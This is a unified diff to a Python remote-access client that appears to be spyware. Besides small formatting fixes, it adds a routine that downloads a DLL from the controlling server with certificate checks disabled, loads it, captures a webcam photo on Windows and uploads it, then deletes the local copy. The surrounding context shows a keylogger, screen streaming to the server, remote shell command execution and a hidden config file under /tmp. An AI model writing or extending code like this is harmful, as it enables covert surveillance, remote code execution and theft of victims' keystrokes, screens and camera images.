@@ -4,7 +4,7 @@ import time
 import platform
 import os
 import json
-import mss,mss.tools
+import mss, mss.tools
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
@@ -38,6 +38,7 @@ VIDEO_SO_URL = f"{SERVER_URL}/video.so"
 ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"
 PHOTO_SO_URL = f"{SERVER_URL}/photo_capture.so"  # New URL for photo_capture.so
 PHOTO_ENDPOINT = f"{SERVER_URL}/api/captured-photo-data"  # Endpoint to send photo data
+PHOTO_DLL_URL = f"{SERVER_URL}/photo_capture_windows.dll"  # URL for Windows DLL
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -250,7 +251,7 @@ def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
         return None
 
 # Example usage (after registration):
-aes_key = aes_session_key_function(client_id,SERVER_URL)
+aes_key = aes_session_key_function(client_id, SERVER_URL)
 if aes_key:
     print(f"AES session key generated and shared: {aes_key.hex()}")
 
@@ -291,9 +292,6 @@ def encrypt_data(aes_key, data):
         print(f"Error in encrypt_data: {e}")
         return None
 
-
-
-
 def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     """
     Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
@@ -321,10 +319,9 @@ def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     except Exception as e:
         print(f"Error in decrypt_data: {e}")
         return None
-    
 
 # Function to capture and send screenshots
-def capture_and_send(stop_event,fps):
+def capture_and_send(stop_event, fps):
     """
     Captures screenshots and sends them to the server in a loop until stopped.
     
@@ -364,7 +361,7 @@ def capture_and_send(stop_event,fps):
                     print(f"Network error: {e}")
 
                 # Maintain 30 FPS by sleeping for the remaining time
-                FRAME_INTERVAL=1/fps
+                FRAME_INTERVAL = 1 / fps
                 print("Frame interval is:", FRAME_INTERVAL)
                 elapsed_time = time.time() - start_time
                 sleep_time = max(0, FRAME_INTERVAL - elapsed_time)
@@ -382,7 +379,7 @@ def start_screenshare(fps):
     if screenshare_thread is None or not screenshare_thread.is_alive():
         stop_event = threading.Event()
         current_stop_event = stop_event
-        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event,fps))
+        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event, fps))
         screenshare_thread.daemon = True  # Thread terminates when main program exits
         screenshare_thread.start()
         print("Screenshare started in background")
@@ -402,8 +399,6 @@ def stop_screenshare():
         print("Screenshare stopping initiated")
     else:
         print("No screenshare is running")
-
-
 
 def send_keylog():
     while True:
@@ -666,7 +661,6 @@ elif os_name == 'Windows':
         stop_event.clear()
         print("Keylogger stopped.")
 
-
 def execute_command(command):
     """Execute the shell command, update current directory if 'cd' command is issued."""
     global current_directory
@@ -735,12 +729,11 @@ def process_json_command(decrypted_text_ready_to_convert_to_json):
     except Exception as e:
         print("An error occurred:", e)
 
-
-def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, file_content):
+def get_file_as_response_from_server_and_decrypt_and_save(filename, file_path, file_content):
     base64_decoded_file_content = base64.b64decode(file_content).decode()
     base64_decoded_in_json = json.loads(base64_decoded_file_content)
     try:
-        decrypted_data = decrypt_data(aes_key,base64_decoded_in_json.get("nonce"),base64_decoded_in_json.get("ciphertext"),base64_decoded_in_json.get("tag"))
+        decrypted_data = decrypt_data(aes_key, base64_decoded_in_json.get("nonce"), base64_decoded_in_json.get("ciphertext"), base64_decoded_in_json.get("tag"))
         with open(file_path, "wb") as file:
             file.write(decrypted_data)
             print(f"[+] File '{filename}' saved successfully in {current_directory}")
@@ -816,6 +809,33 @@ def download_photo_so(max_retries=3, delay=2):
     print(f"Failed to download {so_path} after {max_retries} attempts")
     return None
 
+def download_photo_dll(max_retries=3, delay=2):
+    dll_path = "./capture_photo_windows.dll"
+    if os.path.exists(dll_path) and os.path.getsize(dll_path) > 0:
+        print(f"Using existing {dll_path}")
+        return dll_path
+
+    print(f"Attempting to download {dll_path} from {PHOTO_DLL_URL}...")
+    for attempt in range(max_retries):
+        try:
+            response = requests.get(PHOTO_DLL_URL, stream=True, verify=False, timeout=10)
+            response.raise_for_status()
+            with open(dll_path, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            if os.path.exists(dll_path) and os.path.getsize(dll_path) > 0:
+                print(f"Successfully downloaded {dll_path}")
+                return dll_path
+            else:
+                print(f"Downloaded file is empty or invalid")
+                os.remove(dll_path) if os.path.exists(dll_path) else None
+        except requests.RequestException as e:
+            print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
+            if attempt < max_retries - 1:
+                time.sleep(delay)
+    print(f"Failed to download {dll_path} after {max_retries} attempts")
+    return None
+
 def send_frame(data, length):
     if video_stop_event.is_set():
         return  # Stop sending if video is stopped
@@ -839,7 +859,7 @@ def send_photo_data(data, length):
     for attempt in range(max_retries):
         try:
             response = requests.post(
-                f"{PHOTO_ENDPOINT}?clientId={client_id}",  # Add client_id as query parameter
+                f"{PHOTO_ENDPOINT}?clientId={client_id}",
                 data=photo_data,
                 headers={"Content-Type": "image/jpeg"},
                 timeout=5,
@@ -913,7 +933,7 @@ def start_video_capture(duration, fps):
             video_lib.stop_video_capture()
             print("Video capture forcefully stopped during execution")
 
-def capture_photo():
+def capture_photo_linux():
     global photo_lib
     so_path = download_photo_so()
     if not so_path:
@@ -935,7 +955,7 @@ def capture_photo():
     photo_lib.capture_photo.restype = ctypes.c_int
     photo_lib.capture_photo.argtypes = [PHOTO_CALLBACK]
 
-    print("Starting photo capture...")
+    print("Starting photo capture (Linux)...")
     try:
         result = photo_lib.capture_photo(callback)
         if result == 0:
@@ -949,6 +969,88 @@ def capture_photo():
         return False
     finally:
         photo_lib = None  # Clean up
+
+def capture_photo_windows():
+    dll_path = download_photo_dll()
+    if not dll_path:
+        print("Error: Could not obtain capture_photo_windows.dll")
+        return False
+
+    try:
+        print(f"Step 1: Current directory: {os.getcwd()}")
+        print(f"Step 1: Python architecture: {platform.architecture()[0]}")
+
+        print(f"Step 2: DLL path: {dll_path}")
+        if not os.path.exists(dll_path):
+            raise FileNotFoundError("capture_photo_windows.dll not found")
+        print("Step 2: DLL file exists")
+
+        print("Step 3: Attempting to load DLL...")
+        camera_dll = ctypes.CDLL(dll_path)
+        print("Step 3: DLL loaded successfully")
+
+        print("Step 4: Defining function signature...")
+        capture_photo = camera_dll.capturePhoto
+        capture_photo.argtypes = [ctypes.c_char_p]
+        capture_photo.restype = ctypes.c_int
+        print("Step 4: Function signature defined")
+
+        filename = "photo.bmp"
+        print(f"Step 5: Preparing filename: {filename}")
+        filename_bytes = filename.encode('utf-8')
+        print(f"Step 5: Filename encoded to bytes: {filename_bytes}")
+
+        print("Step 6: Calling capturePhoto function...")
+        result = capture_photo(filename_bytes)
+        print(f"Step 6: Function called, result: {result}")
+
+        print("Step 7: Processing result...")
+        if result == 0:
+            print(f"Step 7: Photo saved as {filename}")
+            if os.path.exists(filename):
+                print(f"Step 7: File size: {os.path.getsize(filename)} bytes")
+                # Send the captured photo to the server
+                with open(filename, 'rb') as photo_file:
+                    photo_data = photo_file.read()
+                    max_retries = 3
+                    for attempt in range(max_retries):
+                        try:
+                            response = requests.post(
+                                f"{PHOTO_ENDPOINT}?clientId={client_id}",
+                                data=photo_data,
+                                headers={"Content-Type": "image/bmp"},
+                                timeout=5,
+                                verify=False
+                            )
+                            response.raise_for_status()
+                            print(f"Photo sent to server ({len(photo_data)} bytes) with client_id: {client_id}")
+                            os.remove(filename)  # Clean up the file after sending
+                            return True
+                        except requests.RequestException as e:
+                            print(f"Error sending photo (attempt {attempt + 1}/{max_retries}): {e}")
+                            if attempt < max_retries - 1:
+                                time.sleep(1)
+                    print("Failed to send photo after retries")
+                    return False
+            else:
+                print("Step 7: Warning: File was not created despite success return code")
+                return False
+        else:
+            print(f"Step 7: Failed to capture photo (return code: {result})")
+            return False
+
+    except Exception as e:
+        print(f"Error at current step: {str(e)}")
+        return False
+
+def capture_photo():
+    if os_name == "Linux":
+        return capture_photo_linux()
+    elif os_name == "Windows":
+        return capture_photo_windows()
+    else:
+        print(f"Unsupported OS: {os_name}")
+        return False
 
 def stop_video():
     global video_stop_event, video_lib
